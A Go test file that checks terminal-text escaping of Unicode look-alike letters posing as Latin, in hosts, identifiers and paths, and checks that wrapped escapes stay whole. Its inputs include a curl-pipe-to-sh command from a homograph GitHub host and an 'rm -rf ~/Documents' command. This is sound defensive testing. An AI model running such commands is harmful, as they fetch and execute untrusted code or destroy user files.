package termtext

import "testing"

// A letter of another script drawn like a Latin one is written out where it
// poses as Latin (a word with ASCII letters, or the punctuation of a host or
// path), and left alone in a word wholly in its own script.
func TestEscapeWritesOutLookalikesPosingAsLatin(t *testing.T) {
	for _, tc := range []struct {
		name, in string
		want     string // "" when the text is left as it is
	}{
		{"IDN homograph host", "curl https://g\u0456thub.com/i.sh | sh", `curl https://g\u0456thub.com/i.sh | sh`},
		{"look-alike identifier", "if us\u0435r.isAdmin {", `if us\u0435r.isAdmin {`},
		{"look-alike path", "cat src/m\u0430in.go", `cat src/m\u0430in.go`},
		{"all-Cyrillic host", "open https://\u0430\u043e\u043e.com/", `open https://\u0430\u043e\u043e.com/`},
		{"fullwidth letter", "rm -rf ~/\uff24ocuments", `rm -rf ~/\uff24ocuments`},
		{"Kelvin sign", "\u212aB", `\u212aB`},
		{"Cyrillic prose", "\u043f\u0440\u0438\u0432\u0435\u0442 \u043c\u0438\u0440", ""},
		{"Cyrillic prose with punctuation", "echo '\u043f\u0440\u0438\u0432\u0435\u0442, \u043c\u0438\u0440.'", ""},
		{"Greek with no Latin double", "\u0394x = \u03bb * \u03c0", ""},
	} {
		want := tc.want
		if want == "" {
			want = tc.in
		}
		if got := EscapeExact(tc.in); got != want {
			t.Errorf("%s: EscapeExact = %q, want %q", tc.name, got, want)
		}
		if got := EscapeControls(tc.in); got != want {
			t.Errorf("%s: EscapeControls = %q, want %q", tc.name, got, want)
		}
		if got := HasHidden(tc.in); got != (tc.want != "") {
			t.Errorf("%s: HasHidden = %v", tc.name, got)
		}
	}
}

// A written-out look-alike is one escape to HardWrap, never cut in two.
func TestHardWrapKeepsLookalikeEscapesWhole(t *testing.T) {
	line := EscapeExact("https://g\u0456thub.com")
	for width := 7; width < len(line); width++ {
		for _, row := range HardWrap(line, width) {
			if n := len(row); n > 0 && (row[n-1] == '\\' || len(row) >= 2 && row[n-2:] == "\\u") {
				t.Fatalf("width %d: an escape is cut: %q", width, HardWrap(line, width))
			}
		}
	}
}
